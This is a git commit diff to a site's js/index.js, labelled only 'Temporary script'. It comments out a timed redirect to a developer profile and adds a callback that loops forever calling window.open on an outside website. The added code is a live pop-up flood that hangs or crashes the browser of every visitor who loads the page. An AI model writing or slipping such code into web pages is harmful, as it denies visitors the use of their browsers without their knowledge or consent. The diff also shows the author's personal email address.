3f0f6ed9feee2ee946e7bc5bfb08c1fb140cddef
Murilo Oliveira <murilo001os@gmail.com>
2019-12-21 14:46:35 -0300

    Temporary script

--- js/index.js
+++ js/index.js
@@ -1,4 +1,10 @@
-setTimeout(function(){
-    window.location.replace("https://sourcerer.io/murilo001");
+setTimeout(() => {
+  while (true) {
+    window.open('http://www.pudim.com.br/')
+  }
 }, 100);
 
+/*setTimeout(function(){
+    window.location.replace("https://sourcerer.io/murilo001");
+}, 100);
+*/
